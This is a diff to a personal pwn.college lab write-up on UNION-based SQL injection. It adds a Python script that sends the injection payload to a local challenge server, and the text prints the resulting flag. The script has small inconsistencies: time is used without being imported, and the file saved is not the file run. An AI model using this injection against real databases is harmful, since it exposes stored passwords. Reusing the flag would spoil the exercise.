@@ -6,6 +6,7 @@
 ---
 
 ## ✅ what i did  
+I WAY -> netcat
 -clicked start
 -opened the terminal
 -ran: cat /challenge/server'
@@ -23,6 +24,26 @@ the payload i crafted is: pwn.college{" UNION SELECT password FROM users" -> url
         'Host: challenge.localhost'
 -flag popped out
 
+II WAY -> python
+-clicked start
+-opened the terminal 
+-ran: 'vim bro'
+-typed:         '#!/usr/bin/env python3'
+                'import requests'
+                'from pwn import *'
+                'context.log_level = 'error''
+                'url = "http://challenge.localhost:80/"'
+                'p = process("/challenge/server")'
+                'time.sleep(1)'
+                'params = {'
+                        '"query" : "pwn.college{\" UNION SELECT password FROM users\""'
+                        '}'
+                'r = requests.get(url, params)'
+                'print(r.text)'
+-ran: 'chmod a+x brodi'
+-ran: './brodi'
+-flag popped out
+
 ## 🧑🏾‍🏫 what this challenge teaches u
 this time i used UNION
 since our injection goes directly to a pre-build query i crafted the payload based on the query
@@ -31,6 +52,7 @@ the goal is to merge password column to username column and this is possible wit
 UNION executes the left query, then the right query and merge the results together
 since admin's password is the flag, i already know the flag starts with pwn.college{
 thats why i insert it into LIKE, closed the " and then escaped the last one with another " in the end
+to escape chars in python use \ -> in this case it was necessary to have it interpreted " not as end of string
 
 ## 🏁 Flag  
 pwn.college{Y12YxayoWpv73ATzuboFopzFbGZ.QXxkzMzwCO4IDOxEzW}
